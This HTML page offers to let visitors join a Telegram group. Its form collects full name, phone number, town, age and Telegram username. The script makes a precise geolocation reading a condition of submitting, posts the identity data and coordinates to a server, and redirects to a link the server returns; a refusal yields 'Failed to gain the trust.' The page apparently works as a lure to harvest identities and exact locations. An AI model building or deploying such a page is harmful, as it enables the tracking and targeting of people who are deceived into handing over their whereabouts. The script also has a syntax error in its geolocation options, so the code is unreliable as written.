<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Join Telegram Group</title>
  <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'SF Pro Display', sans-serif;
    }
    body {
      background: #f2f2f7;
      color: #000;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      padding: 20px;
    }
    h2 {
      font-size: 1.8rem;
      margin-bottom: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      transition: all 0.3s ease;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 12px;
      font-size: 1rem;
    }
    input:focus {
      border-color: #007aff;
      outline: none;
    }
    button {
      background: #007aff;
      color: #fff;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    button:hover {
      background: #005ecb;
    }
    .progress-container {
      margin-top: 10px;
      display: none;
    }
    .progress-bar {
      height: 5px;
      width: 0;
      background: #007aff;
      border-radius: 2px;
      transition: width 0.4s ease;
    }
    .status {
      margin-top: 10px;
      text-align: center;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <h2>Join Our Telegram Group</h2>
  <form id="userForm">
    <input type="text" name="fullname" placeholder="Full Name" required>
    <input type="text" name="phone" placeholder="Phone Number" required>
    <input type="text" name="towncity" placeholder="Town/City" required>
    <input type="number" name="age" placeholder="Age" required>
    <input type="text" name="telegram" placeholder="Telegram Username" required>
    <button type="submit">Submit</button>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status" id="status"></div>
  </form>  <script>
    const form = document.getElementById("userForm");
    const progressBar = document.getElementById("progressBar");
    const statusText = document.getElementById("status");
    const progressContainer = document.querySelector(".progress-container");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      progressContainer.style.display = "block";
      progressBar.style.width = "20%";
      statusText.textContent = "Requesting location...";

      navigator.geolocation.getCurrentPosition(success, error, {
        enableHighAccuracy: true,
        timeout: 5000
        maximumAge:0
      });

      function success(position) {
        progressBar.style.width = "50%";
        statusText.textContent = "Sending data...";

        const { latitude, longitude } = position.coords;
        const data = {
          fullname: form.fullname.value.trim(),
          phone: form.phone.value.trim(),
          towncity: form.towncity.value.trim(),
          age: form.age.value.trim(),
          telegram: form.telegram.value.trim(),
          latitude,
          longitude
        };

        fetch("/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(response => {
          progressBar.style.width = "100%";
          if (response.link) {
            statusText.textContent = "Redirecting...";
            setTimeout(() => {
              window.location.href = response.link;
            }, 1000);
          } else {
            statusText.textContent = response.error || "Something went wrong.";
          }
        })
        .catch(() => {
          statusText.textContent = "Network error.";
        });
      }

      function error() {
        progressBar.style.width = "100%";
        statusText.textContent = "Failed to gain the trust.";
      }
    });
  </script></body>
</html>
